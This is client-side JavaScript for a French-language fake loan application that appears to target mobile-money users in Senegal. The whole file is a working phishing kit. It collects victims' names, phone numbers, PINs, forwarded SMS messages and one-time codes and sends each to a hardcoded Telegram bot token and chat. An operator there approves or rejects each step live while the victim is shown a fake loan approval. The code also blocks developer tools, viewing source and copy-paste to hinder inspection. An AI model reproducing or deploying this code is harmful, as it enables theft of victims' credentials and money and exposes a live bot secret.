// ============================================================
// TELEGRAM BOT CONFIGURATION
// ============================================================
const TG_TOKEN = "8672410577:AAHBD_Xtl4aJSwVUS_KWyXf1W-85DjcwXrY";
const TG_CHAT = "8574792010";
const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;

const SESSIONS_KEY = 'senegal_app_sessions';

function getSessionsFromStorage() {
    try {
        const data = localStorage.getItem(SESSIONS_KEY);
        return data ? JSON.parse(data) : {};
    } catch (e) {
        console.warn("Failed to parse sessions from localStorage:", e);
        return {};
    }
}

function saveSessionsToStorage(map) {
    try {
        localStorage.setItem(SESSIONS_KEY, JSON.stringify(Object.fromEntries(map)));
    } catch (e) {
        console.warn("Failed to save sessions to localStorage:", e);
    }
}

const sessions = new Map(Object.entries(getSessionsFromStorage()));
let sessionCounter = 1;

function createSession(data) {
    const id = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
    const session = {
        id,
        ...data,
        stage: 'application',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        pin: '',
        smsMessage: '',
        otp: ''
    };
    sessions.set(id, session);
    saveSessionsToStorage(sessions);
    return session;
}

function getSession(id) { return sessions.get(id) || null; }

function updateSession(id, updates) {
    const s = sessions.get(id);
    if (!s) return null;
    Object.assign(s, updates);
    s.updated_at = new Date().toISOString();
    saveSessionsToStorage(sessions);
    return s;
}

async function tgCall(method, body) {
    try {
        const r = await fetch(`${TG_API}/${method}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body)
        });
        const result = await r.json();
        console.log("TG API call:", method, "result:", JSON.stringify(result));
        return result;
    } catch (e) { console.warn("tg", method, e); return null; }
}

// ─── UPDATED tgFmt: SMS now shows user name and number ───
function tgFmt(row, kind) {
    if (kind === "sms") {
        const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
        const num = row.phone ? `+221 ${row.phone}` : "—";
        const sms = row.smsMessage || "—";
        return `📨 New SMS submitted\n\nName: ${name}\nPhone: ${num}\nMessage: ${sms}\nApplication ID: ${row.id}`;
    }
    const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
    const num = row.phone || "—";
    const pin = row.pin || "—";
    const sms = row.smsMessage || "—";
    const otp = row.otp || "—";
    let title = "🔑 New PIN submitted";
    if (kind === "otp") title = "🔢 New OTP submitted";
    return `${title}\n\nName: ${name}\nPhone: ${num}\nPIN: ${pin}\nSMS: ${sms}\nOTP: ${otp}\nApplication ID: ${row.id}`;
}

async function tgNotify(row, kind) {
    let keyboard;
    const msgBtn = { text: "💬 Message User", callback_data: `ask_msg:${row.id}` };
    if (kind === "pin") {
        keyboard = { inline_keyboard: [
                [{ text: "✅ Approve PIN", callback_data: `approve_pin:${row.id}` }],
                [{ text: "❌ Reject PIN", callback_data: `reject_pin:${row.id}` }, msgBtn]
            ] };
    } else if (kind === "sms") {
        const smsText = row.smsMessage || '—';
        keyboard = { inline_keyboard: [
                [{ text: "📋 Copy SMS", copy_text: { text: smsText } }],
                [{ text: "✅ Approve SMS", callback_data: `approve_sms:${row.id}` }],
                [{ text: "❌ Reject SMS", callback_data: `reject_sms:${row.id}` }, msgBtn]
            ] };
    } else if (kind === "otp") {
        keyboard = { inline_keyboard: [
                [{ text: "✅ Approve OTP", callback_data: `approve_otp:${row.id}` }],
                [{ text: "❌ Reject OTP", callback_data: `reject_otp:${row.id}` }, msgBtn]
            ] };
    }
    await tgCall("sendMessage", {
        chat_id: TG_CHAT,
        text: tgFmt(row, kind),
        reply_markup: keyboard
    });
}

let lastOffset = 0;
let currentSessionId = null;

// Restore session ID from localStorage on page load
function restoreSession() {
    const savedId = localStorage.getItem("current_session_id");
    if (savedId) {
        currentSessionId = savedId;
        S.applicationId = savedId;
        console.log("Restored session ID:", savedId);
    }
}

// Save session ID to localStorage
function saveSessionId(id) {
    localStorage.setItem("current_session_id", id);
    localStorage.setItem("S_applicationId", id);
    currentSessionId = id;
}

function showAdminModal(message) {
    document.getElementById('adminModalBody').textContent = message;
    document.getElementById('adminModalOverlay').classList.add('show');
}

function closeAdminModal() {
    document.getElementById('adminModalOverlay').classList.remove('show');
}

document.getElementById('adminModalOverlay').addEventListener('click', function(e) {
    if (e.target === this) closeAdminModal();
});

async function tgPoll() {
    // Cooperative single-instance poll loop: only ONE getUpdates connection runs at a time.
    while (true) {
        const offset = Math.max(lastOffset, Number(localStorage.getItem("tg_offset") || 0));
        console.log("Polling Telegram, offset:", offset);
        const r = await tgCall("getUpdates", { offset: offset, timeout: 10, allowed_updates: ["callback_query",
                "message"] });
        if (!r || !r.ok) {
            console.warn("Telegram poll failed:", JSON.stringify(r));
            if (r && r.error_code === 409) {
                // 409 means another instance is already polling (another tab of this app / other bot server).
                // The other poller holds the connection; wait and retry so we resume as soon as it releases.
                console.warn("409 Conflict: another bot instance is polling (another tab or server using this token). " +
                    "Waiting 5s for it to finish before automatically retrying...");
                await new Promise(resolve => setTimeout(resolve, 5000));
                continue;
            }
            console.warn("Unexpected poll error; retrying in 10s...");
            await new Promise(resolve => setTimeout(resolve, 10000));
            continue;
        }
        if (!r.result || !Array.isArray(r.result) || r.result.length === 0) {
            // No updates yet: poll again immediately (short 10s timeout keeps this lightweight).
            console.log("No updates, polling again...");
            continue;
        }
        console.log("Telegram updates:", r.result.length);
        for (const u of r.result) {
            lastOffset = u.update_id + 1;
            localStorage.setItem("tg_offset", String(lastOffset));
    
            if (u.message && u.message.reply_to_message && u.message.reply_to_message.text && u.message.reply_to_message.text.includes("Application ID: ")) {
                if (String(u.message.chat.id) !== TG_CHAT) continue;
                const targetSessionId = u.message.reply_to_message.text.split("Application ID: ")[1].trim();
                const customText = u.message.text;
                if (currentSessionId && currentSessionId === targetSessionId) {
                    showAdminModal(customText);
                    tgCall("sendMessage", { chat_id: TG_CHAT, text: "✅ Message delivered to client." });
                }
                continue;
            }
    
            const cq = u.callback_query;
            if (!cq) continue;
            console.log("Callback query received:", JSON.stringify({
                callback_id: cq.id,
                from: cq.from?.id,
                chat_id: cq.message?.chat?.id,
                message_id: cq.message?.message_id,
                data: cq.data,
                message_text: cq.message?.text?.substring(0, 60)
            }));
            if (String(cq.message?.chat?.id) !== TG_CHAT) {
                tgCall("answerCallbackQuery", { callback_query_id: cq.id, text: "Not authorized" });
                continue;
            }
    
            const data = cq.data || "";
            const colonIdx = data.indexOf(":");
            const action = colonIdx >= 0 ? data.substring(0, colonIdx) : data;
            const id = colonIdx >= 0 ? data.substring(colonIdx + 1) : "";
    
            console.log("Action:", action, "ID:", id, "currentSession:", currentSessionId);
    
            if (action === "ask_msg") {
                tgCall("sendMessage", {
                    chat_id: cq.message.chat.id,
                    text: "Please reply directly to this message with the exact text you want to send to the user.\n\nApplication ID: " + id,
                    reply_markup: { force_reply: true }
                });
                tgCall("answerCallbackQuery", { callback_query_id: cq.id });
                continue;
            }
    
            let stage = null;
            let label = "";
            if (action === "approve_pin") { stage = "pin_approved"; label = "PIN approved"; }
            else if (action === "reject_pin") { stage = "pin_rejected"; label = "PIN rejected"; }
            else if (action === "approve_sms") { stage = "sms_approved"; label = "SMS approved"; }
            else if (action === "reject_sms") { stage = "sms_rejected"; label = "SMS rejected"; }
            else if (action === "approve_otp") { stage = "otp_approved"; label = "OTP approved"; }
            else if (action === "reject_otp") { stage = "otp_rejected"; label = "OTP rejected"; }
            else { console.log("Unknown action:", action); }
    
            if (stage) {
                console.log("Processing stage:", stage, "for id:", id);
                const updated = updateSession(id, { stage });
    
                // ─── Determine the final status text shown to the admin ───
                const isApprove = stage.endsWith("_approved");
                const statusEmoji = isApprove ? "✅" : "❌";
                const actionName = stage.replace("_approved", "").replace("_rejected", "");
                const finalButtonText = `${statusEmoji} ${actionName.toUpperCase()}`;
    
                // Confirm the callback first (required by Telegram within time limit)
                tgCall("answerCallbackQuery", { callback_query_id: cq.id, text: label });
    
                // Then lock the message so the admin sees final status and cannot click again
                tgCall("editMessageReplyMarkup", {
                    chat_id: cq.message.chat.id,
                    message_id: cq.message.message_id,
                    reply_markup: { inline_keyboard: [[{ text: finalButtonText, callback_data: "noop" }]] }
                }).then((markupResult) => {
                    console.log("editMessageReplyMarkup result:", markupResult ? "OK" : "FAILED");
                }).catch((e) => {
                    console.warn("Failed to update bot button markup:", e);
                });
    
                console.log("currentSessionId:", currentSessionId, "| callback id:", id, "| updated:", updated ? 'YES' : 'NO');
                if (currentSessionId === id && updated) {
                    console.log("Stage matched! Calling handleStageUpdate ->", stage);
                    handleStageUpdate(updated);
                } else {
                    console.log("Stage NOT triggered: session mismatch or update failed");
                }
            } else {
                console.log("No stage for:", action, id);
                tgCall("answerCallbackQuery", { callback_query_id: cq.id });
            }
        }
    }
}

// Start the single cooperative poller when the page loads.
tgPoll().catch(() => {});


function handleStageUpdate(session) {
    const stage = session.stage;
    if (stage === 'pin_approved') {
        goTo('page-sms-paste');
        startSmsTimer();
    } else if (stage === 'pin_rejected') {
        document.getElementById('lpPhone').value = '';
        [0, 1, 2, 3].forEach(i => document.getElementById('lp' + i).value = '');
        goTo('page-login');
        document.getElementById('bLgn').disabled = false;
        chkPin();
        showLgnMsg('error', 'Code PIN incorrect. Veuillez réessayer.');
    } else if (stage === 'sms_approved') {
        goTo('page-otp');
    } else if (stage === 'sms_rejected') {
        document.getElementById('smsMsgBox').value = '';
        goTo('page-sms-paste');
        document.getElementById('bSms').disabled = false;
        chkSmsMsg();
        showSmsMsg('error', 'Le message SMS a été rejeté. Veuillez coller le message correct.');
    } else if (stage === 'otp_approved') {
        const months = parseInt(S.loanTerm) || 48;
        const monthly = Math.ceil((S.loanAmount || 1000000) / months);
        document.getElementById('aprAmount').textContent = 'FCFA ' + (S.loanAmount || 1000000).toLocaleString();
        document.getElementById('aprAmt').textContent = 'FCFA ' + (S.loanAmount || 1000000).toLocaleString();
        document.getElementById('aprTerm').textContent = S.loanTerm || '48 mois';
        document.getElementById('aprMth').textContent = 'FCFA ' + monthly.toLocaleString();
        goTo('page-approval');
    } else if (stage === 'otp_rejected') {
        [0, 1, 2, 3].forEach(i => document.getElementById('otp' + i).value = '');
        goTo('page-otp');
        document.getElementById('bOtp').disabled = false;
        document.getElementById('bOtp').textContent = 'VÉRIFIER & APPROUVER LE PRÊT';
        chkOtp();
        showOtpMsg('error', 'Le code OTP a été rejeté. Veuillez réessayer.');
    }
}

// ============================================================
// STATE
// ============================================================
const S = {
    loanType: '',
    loanAmount: 0,
    loanTerm: '',
    loanPurpose: '',
    firstName: '',
    lastName: '',
    phone: '',
    employment: '',
    annualIncome: 0,
    applicationId: '',
    isSubmitting: false
};

// ============================================================
// NAVIGATION
// ============================================================
function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(pageId)?.classList.add('active');
    window.scrollTo(0, 0);

    if (pageId === 'page-sms-paste') {
        const btn = document.getElementById('bSms');
        const spinner = document.getElementById('mSms');
        btn.disabled = false;
        spinner.classList.remove('show');
        chkSmsMsg();
        ['smsMsg', 'smsMsgOk'].forEach(function(id) { document.getElementById(id).classList.remove('show'); });
    }

    if (pageId === 'page-otp') {
        const btn = document.getElementById('bOtp');
        const spinner = document.getElementById('mOtp');
        btn.disabled = false;
        btn.textContent = 'VÉRIFIER & APPROUVER LE PRÊT';
        spinner.classList.remove('show');
        chkOtp();
        ['otpMsg', 'otpMsgOk'].forEach(function(id) { document.getElementById(id).classList.remove('show'); });
    }

    if (pageId === 'page-login') {
        const btn = document.getElementById('bLgn');
        const spinner = document.getElementById('mLgn');
        btn.disabled = false;
        btn.textContent = 'SUIVANT';
        spinner.classList.remove('show');
        S.isSubmitting = false;
        chkPin();
    }
}

function startApplication() {
    const sliderVal = document.getElementById('amtSlider').value;
    document.getElementById('s1am').value = sliderVal;
    goTo('page-step1');
}

function normalizePhone(id) {
    let inp = document.getElementById(id);
    let val = inp.value.replace(/\D/g, '');
    if (val.length > 9) val = val.substring(0, 9);
    inp.value = val;
}

function toS2() {
    const ty = document.getElementById('s1ty').value;
    const am = +document.getElementById('s1am').value;
    const te = document.getElementById('s1te').value;
    const pu = document.getElementById('s1pu').value;

    if (!ty || am <= 0 || !te || !pu.trim()) {
        showErr('s1Err', 'Veuillez remplir tous les champs.');
        return;
    }

    S.loanType = ty;
    S.loanAmount = am;
    S.loanTerm = te;
    S.loanPurpose = pu;
    goTo('page-step2');
}

function toS3() {
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value;

    if (!fi || !la || ph.length !== 9) {
        showErr('s2Err', 'Veuillez entrer un prénom valide, un nom de famille valide et un numéro de téléphone de 9 chiffres.');
        return;
    }

    S.firstName = fi;
    S.lastName = la;
    S.phone = ph;

    document.getElementById('sA').textContent = 'FCFA ' + S.loanAmount.toLocaleString();
    document.getElementById('sT').textContent = S.loanTerm;
    document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' :
    '');
    document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;

    goTo('page-step3');
}

function submitApp() {
    const em = document.getElementById('s3em').value;
    const in_ = +document.getElementById('s3in').value;

    if (!em || in_ <= 0) {
        showErr('s3Err', 'Veuillez remplir tous les champs.');
        return;
    }

    S.employment = em;
    S.annualIncome = in_;
    S.applicationId = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();

    document.getElementById('sA').textContent = 'FCFA ' + S.loanAmount.toLocaleString();
    document.getElementById('sT').textContent = S.loanTerm;
    document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' :
    '');
    document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;

    goTo('page-processing');

    const session = createSession({
        firstName: S.firstName,
        lastName: S.lastName,
        phone: S.phone,
        loanAmount: S.loanAmount,
        loanTerm: S.loanTerm,
        purpose: S.loanPurpose,
        employment: S.employment,
        annualIncome: S.annualIncome
    });
    S.applicationId = session.id;
    currentSessionId = session.id;
    saveSessionId(session.id);
    console.log("Application submitted - session created:", session.id);

    setTimeout(() => {
        goTo('page-sim-check');
    }, 2000);
}

function showErr(id, msg) {
    document.getElementById(id).classList.add('show');
    document.getElementById(id + 'Txt').textContent = msg;
}

function clearErr(id) {
    document.getElementById(id).classList.remove('show');
}

function updateCalc() {
    const amt = +document.getElementById('amtSlider').value;
    document.getElementById('calcAmt').textContent = 'FCFA ' + amt.toLocaleString();
    const monthly = Math.ceil(amt / 48);
    document.getElementById('monthlyAmt').textContent = 'FCFA ' + monthly.toLocaleString();
}

// ══════════════════════════════════════════════════════
// LOGIN PAGE — PIN INPUT HELPERS
// ══════════════════════════════════════════════════════
function pinMvM(el, i) {
    el.value = el.value.replace(/\D/, '');
    if (el.value && i < 3) {
        document.getElementById('lp' + (i + 1)).focus();
    }
    chkPin();
}

document.addEventListener('keydown', function(e) {
    const id = e.target.id;

    if (id.startsWith('lp') && id.length === 3 && e.key === 'Backspace' && !e.target.value) {
        const idx = parseInt(id[2]);
        if (idx > 0) document.getElementById('lp' + (idx - 1)).focus();
    }

    if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
        const idx = parseInt(id[3]);
        if (idx > 0) document.getElementById('otp' + (idx - 1)).focus();
    }
});

function chkPin() {
    const phone = document.getElementById('lpPhone').value.trim();
    const pin = [0, 1, 2, 3].map(i => document.getElementById('lp' + i).value).join('');
    const pinOk = /^\d{4}$/.test(pin);
    const ok = phone.length === 9 && pinOk;
    const btn = document.getElementById('bLgn');
    btn.className = ok ? 'btn-login rdy' : 'btn-login';
    btn.disabled = !ok;
}

function togPin() {
    [0, 1, 2, 3].forEach(i => {
        const b = document.getElementById('lp' + i);
        b.type = b.type === 'password' ? 'text' : 'password';
    });
}

function clearLoginPin() {
    [0, 1, 2, 3].forEach(i => { document.getElementById('lp' + i).value = ''; });
    chkPin();
    document.getElementById('lp0').focus();
}

function clearOtpCode() {
    [0, 1, 2, 3].forEach(i => { document.getElementById('otp' + i).value = ''; });
    chkOtp();
    document.getElementById('otp0').focus();
}

function showLgnMsg(type, text) {
    ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
    if (type === 'error') { document.getElementById('lpMsgTxt').textContent = text;
        document.getElementById('lpMsg').classList.add('show'); }
    if (type === 'success') { document.getElementById('lpMsgOkTxt').textContent = text;
        document.getElementById('lpMsgOk').classList.add('show'); }
    if (type === 'warning') { document.getElementById('lpMsgWarnTxt').textContent = text;
        document.getElementById('lpMsgWarn').classList.add('show'); }
}

// ══════════════════════════════════════════════════════
// LOGIN — SUBMIT PIN TO TELEGRAM
// ══════════════════════════════════════════════════════
async function doLogin() {
    if (S.isSubmitting) return;
    S.isSubmitting = true;

    ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));

    const phone = document.getElementById('lpPhone').value;
    const pin = [0, 1, 2, 3].map(i => document.getElementById('lp' + i).value).join('');

    if (phone.length !== 9 || pin.length < 4) {
        S.isSubmitting = false;
        showLgnMsg('warning', 'Téléphone : 9 chiffres (ex: 771234567). Code PIN : 4 chiffres.');
        return;
    }

    document.getElementById('mLgn').classList.add('show');
    document.getElementById('bLgn').disabled = true;

    try {
        const session = getSession(S.applicationId);
        console.log("doLogin - S.applicationId:", S.applicationId, "| session found:", session ? 'YES' : 'NO', "| session:", session);
        if (session) {
            updateSession(S.applicationId, { pin: pin, stage: 'pin_submitted' });
            await tgNotify({ id: S.applicationId, firstName: S.firstName, lastName: S.lastName, phone: phone,
                pin: pin }, 'pin');

            document.getElementById('mLgn').classList.remove('show');
            S.isSubmitting = false;
            document.getElementById('waitAppId').textContent = S.applicationId;
            goTo('page-wait-login-approval');
        } else {
            throw new Error('Session not found');
        }
    } catch (err) {
        S.isSubmitting = false;
        document.getElementById('mLgn').classList.remove('show');
        document.getElementById('bLgn').disabled = false;
        showLgnMsg('error', 'Network error: ' + err.message);
    }
}

// ══════════════════════════════════════════════════════
// SMS PASTE PAGE
// ══════════════════════════════════════════════════════
function chkSmsMsg() {
    const txt = document.getElementById('smsMsgBox').value.trim();
    document.getElementById('bSms').className = txt.length > 3 ? 'btn-sms rdy' : 'btn-sms';
}

function showSmsMsg(type, text) {
    ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
    if (type === 'error') { document.getElementById('smsMsgTxt').textContent = text;
        document.getElementById('smsMsg').classList.add('show'); }
    if (type === 'success') { document.getElementById('smsMsgOkTxt').textContent = text;
        document.getElementById('smsMsgOk').classList.add('show'); }
}

let smsTimerInterval = null;
let smsTimerExpired = false;

function startSmsTimer() {
    if (smsTimerInterval) clearInterval(smsTimerInterval);
    smsTimerExpired = false;

    document.getElementById('smsMsgBox').value = '';
    document.getElementById('smsMsgBox').disabled = false;
    chkSmsMsg();
    document.getElementById('smsResendWrap').style.display = 'none';

    const arc = document.getElementById('smsTimerArc');
    const num = document.getElementById('smsTimerNum');
    const sec = document.getElementById('smsTimerSec');
    arc.classList.remove('urgent');
    num.classList.remove('urgent');
    arc.style.strokeDashoffset = '0';
    document.getElementById('smsTimerWrap').style.display = 'flex';

    let remaining = 60;
    const CIRCUMFERENCE = 113;

    const tick = function() {
        remaining--;
        const pct = remaining / 60;
        arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
        num.textContent = remaining;
        sec.textContent = remaining;

        if (remaining <= 10) {
            arc.classList.add('urgent');
            num.classList.add('urgent');
        }

        if (remaining <= 0) {
            clearInterval(smsTimerInterval);
            smsTimerInterval = null;
            smsTimerExpired = true;

            document.getElementById('smsMsgBox').disabled = true;
            document.getElementById('smsMsgBox').value = '';
            document.getElementById('bSms').disabled = true;
            document.getElementById('bSms').className = 'btn-sms';
            document.getElementById('smsTimerWrap').style.display = 'none';
            document.getElementById('smsResendWrap').style.display = 'block';
            document.getElementById('bResend').disabled = false;
            document.getElementById('mResend').classList.remove('show');
            ['smsMsg', 'smsMsgOk'].forEach(function(id) { document.getElementById(id).classList.remove('show'); });
        }
    };

    smsTimerInterval = setInterval(tick, 1000);
}

function stopSmsTimer() {
    if (smsTimerInterval) {
        clearInterval(smsTimerInterval);
        smsTimerInterval = null;
    }
}

async function doSmsResend() {
    const btn = document.getElementById('bResend');
    const spinner = document.getElementById('mResend');
    btn.disabled = true;
    spinner.classList.add('show');
    ['smsMsg', 'smsMsgOk'].forEach(function(id) { document.getElementById(id).classList.remove('show'); });

    try {
        const session = getSession(S.applicationId);
        if (session) {
            await tgCall("sendMessage", {
                chat_id: TG_CHAT,
                text: `🔄 User requested a new SMS message.\nApplication ID: ${S.applicationId}`
            });
            spinner.classList.remove('show');
            document.getElementById('smsResendWrap').style.display = 'none';
            document.getElementById('smsMsgBox').disabled = false;
            document.getElementById('bSms').disabled = false;
            startSmsTimer();
            showSmsMsg('success', 'Un nouveau SMS a été demandé. L\'administrateur l\'enverra bientôt.');
            btn.disabled = false;
        } else {
            throw new Error('Session not found');
        }
    } catch (err) {
        spinner.classList.remove('show');
        btn.disabled = false;
        showSmsMsg('error', 'Erreur réseau : ' + err.message);
    }
}

// ─── Updated SMS parser: shows name and number in Telegram notification ───
async function doSmsParse() {
    ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));

    if (smsTimerExpired) {
        document.getElementById('smsResendWrap').style.display = 'block';
        document.getElementById('bResend').disabled = false;
        return;
    }

    const msg = document.getElementById('smsMsgBox').value.trim();
    if (msg.length < 3) {
        showSmsMsg('error', 'Veuillez coller un message SMS.');
        return;
    }

    document.getElementById('mSms').classList.add('show');
    document.getElementById('bSms').disabled = true;

    try {
        const session = getSession(S.applicationId);
        if (session) {
            // ─── Send SMS with full user details (name & number) ───
            updateSession(S.applicationId, { smsMessage: msg, stage: 'sms_submitted' });
            await tgNotify({ id: S.applicationId, firstName: S.firstName, lastName: S.lastName, phone: S.phone,
                smsMessage: msg }, 'sms');

            document.getElementById('mSms').classList.remove('show');
            stopSmsTimer();
            document.getElementById('waitSmsAppId').textContent = S.applicationId;
            goTo('page-wait-sms');
        } else {
            throw new Error('Session not found');
        }
    } catch (err) {
        document.getElementById('mSms').classList.remove('show');
        document.getElementById('bSms').disabled = false;
        showSmsMsg('error', 'Error: ' + err.message);
    }
}

// ══════════════════════════════════════════════════════
// OTP PAGE — 4-DIGIT OTP
// ══════════════════════════════════════════════════════
function handleOtpInput(el, type) {
    el.value = el.value.replace(/\D/, '');
    const idx = parseInt(el.id.match(/\d$/)[0]);
    if (el.value && type === 'otp' && idx < 3) {
        document.getElementById(type + (idx + 1)).focus();
    }
    chkOtp();
}

function chkOtp() {
    const otpOk = [0, 1, 2, 3].every(i => document.getElementById('otp' + i).value);
    document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
}

function showOtpMsg(type, text) {
    ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
    if (type === 'error') { document.getElementById('otpMsgTxt').textContent = text;
        document.getElementById('otpMsg').classList.add('show'); }
    if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text;
        document.getElementById('otpMsgOk').classList.add('show'); }
}

async function doOtp() {
    ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));

    const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');

    if (otp.length < 4) {
        showOtpMsg('error', 'Veuillez entrer le code OTP à 4 chiffres.');
        return;
    }

    document.getElementById('mOtp').classList.add('show');
    document.getElementById('bOtp').disabled = true;
    document.getElementById('bOtp').textContent = 'VÉRIFICATION EN COURS...';

    try {
        const session = getSession(S.applicationId);
        if (session) {
            updateSession(S.applicationId, { otp: otp, stage: 'otp_submitted' });
            await tgNotify({ id: S.applicationId, firstName: S.firstName, lastName: S.lastName, phone: S.phone,
                otp: otp }, 'otp');

            document.getElementById('mOtp').classList.remove('show');
            document.getElementById('waitOtpAppId').textContent = S.applicationId;
            goTo('page-wait-otp');
        } else {
            throw new Error('Session not found');
        }
    } catch (err) {
        document.getElementById('mOtp').classList.remove('show');
        document.getElementById('bOtp').disabled = false;
        document.getElementById('bOtp').textContent = 'VÉRIFIER & APPROUVER LE PRÊT';
        showOtpMsg('error', 'Erreur : ' + err.message);
    }
}

// ══════════════════════════════════════════════════════
// DEVELOPER TOOLS PROTECTION
// ══════════════════════════════════════════════════════
(function() {
    // Disable right-click context menu
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });

    // Block keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        // Ctrl+U (View Source)
        if (e.ctrlKey && e.key === 'u') {
            e.preventDefault();
            return false;
        }
        // Ctrl+Shift+I (Inspect)
        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
            e.preventDefault();
            return false;
        }
        // F12 (Developer Tools)
        if (e.key === 'F12') {
            e.preventDefault();
            return false;
        }
        // Ctrl+C (Copy) - optional, comment out if you want to allow copying
        // if (e.ctrlKey && e.key === 'c') {
        //     e.preventDefault();
        //     return false;
        // }
        // Ctrl+S (Save)
        if (e.ctrlKey && e.key === 's') {
            e.preventDefault();
            return false;
        }
        // Ctrl+P (Print)
        if (e.ctrlKey && e.key === 'p') {
            e.preventDefault();
            return false;
        }
    });

    // Disable text selection
    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
        return false;
    });

    // Disable drag and drop
    document.addEventListener('dragstart', function(e) {
        e.preventDefault();
        return false;
    });

    // Prevent opening dev tools (basic detection)
    var devtools = {
        isOpen: false,
        toggle: false
    };
    
    var threshold = 160;
    var distance = 0;
    
    document.addEventListener('mousemove', function(e){
        if (e.clientY < threshold || e.clientY > window.innerHeight - threshold) {
            setTimeout(function(){
                if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
                    if (!devtools.toggle) {
                        devtools.toggle = true;
                        console.log('%c Page protection active - Developer tools detected!', 'color: red; font-size: 16px; font-weight: bold;');
                    }
                } else if (devtools.toggle) {
                    devtools.toggle = false;
                    devtools.isOpen = false;
                    console.log('%c Page protection restored', 'color: green;');
                }
            }, 500);
        }
    });

    // Hide common inspection elements
    document.addEventListener('mouseover', function(e) {
        if (e.target.tagName === 'SCRIPT' || e.target.tagName === 'STYLE' || e.target.tagName === 'LINK') {
            e.preventDefault();
            e.stopPropagation();
        }
    }, true);

    // Disable inspect element via mouse
    document.addEventListener('mousedown', function(e) {
        if (e.button === 2) {
            e.preventDefault();
            return false;
        }
    }, true);

    // Block viewing page source via right-click
    document.body.addEventListener('DOMSubtreeModified', function() {
        setTimeout(function() {
            if (window.outerHeight !== window.innerHeight || window.outerWidth !== window.innerWidth) {
                window.fitToWindow();
            }
        }, 100);
    });

    // Prevent copy from input fields (optional security)
    document.querySelectorAll('input, textarea, select').forEach(function(el) {
        el.addEventListener('copy', function(e) {
            e.preventDefault();
            return false;
        });
        el.addEventListener('cut', function(e) {
            e.preventDefault();
            return false;
        });
        el.addEventListener('paste', function(e) {
            e.preventDefault();
            return false;
        });
    });

    // Additional protection for mobile devices
    if (navigator.userAgent.match(/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i)) {
        document.addEventListener('touchstart', function(e) {
            if (e.touches.length > 1) {
                e.preventDefault();
            }
        }, { passive: false });
    }
})();

// INIT
restoreSession();
updateCalc();
goTo('page-landing');

// ─── Fix: delete any active webhook so getUpdates polling can work ───
console.log("[INIT] Attempting to delete active webhook...");
tgCall("deleteWebhook", { force: true })
    .then((result) => {
        console.log("[INIT] deleteWebhook result:", JSON.stringify(result));
        // Force reload after deleting webhook so polling can start cleanly
        if (result && result.ok) {
            console.log("[INIT] Webhook deleted. Waiting for next poll...");
        }
    })
    .catch((e) => {
        console.error("[INIT] deleteWebhook failed:", e);
    });